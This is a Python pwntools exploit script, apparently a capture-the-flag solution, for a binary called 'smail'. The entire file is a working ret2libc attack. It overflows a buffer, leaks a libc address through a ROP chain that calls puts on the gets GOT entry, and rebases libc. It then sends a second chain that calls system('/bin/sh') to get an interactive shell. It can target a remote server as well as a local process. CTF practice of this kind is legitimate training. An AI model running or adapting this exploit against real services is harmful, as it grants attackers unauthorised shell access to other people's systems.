#!/usr/bin/env python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './smail'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

#payload formulation
offset = b'A'*72 #found manually with gdb gef

payload = offset
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) #Popping the $RDI register for our argument
payload += p64(elf.got.gets) #putting address of gets in $RDI taken from global offset table
payload += p64(elf.plt.puts) #Executing the puts function with loaded argument
payload += p64(elf.symbols.main) #Returning to the main program with already leaked function


#finding our leak
io.recvline();io.recvline();io.recvline(); #intercept the initial messages
io.sendline(b'2') #respond with choice 2
io.recvline() #intercept the message
io.sendline(payload) #send payload
print(io.recvline()) #normal response 
leak = u64(io.recvline().strip().ljust(8,b'\0')) #address(correct one I think)

#rebasing libc using our calculated base address
log.info(f'Gets leak => {hex(leak)}') #info leak
libc.address = leak - libc.symbols.gets #calculating our base address with leaked address
log.info(f'Libc base => {hex(libc.address)}') #info libc base

#getting a shell, most of the stuff is same from the previous rop chain
payload = offset
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh'))) #filling $RDI with byte string "/bin/sh"
payload += p64(rop.find_gadget(['ret'])[0]) #Ret instruction is for the stack alignment
payload += p64(libc.symbols.system) #executing system function with loaded argument

#sending payload, again copied mostly from previous one
io.recvline();io.recvline();io.recvline(); #intercept the initial messages
io.sendline(b'2') #respond with choice 2
io.recvline() #intercept the message again
io.sendline(payload) #send payload
io.recvline()

# Receive the flag
io.interactive()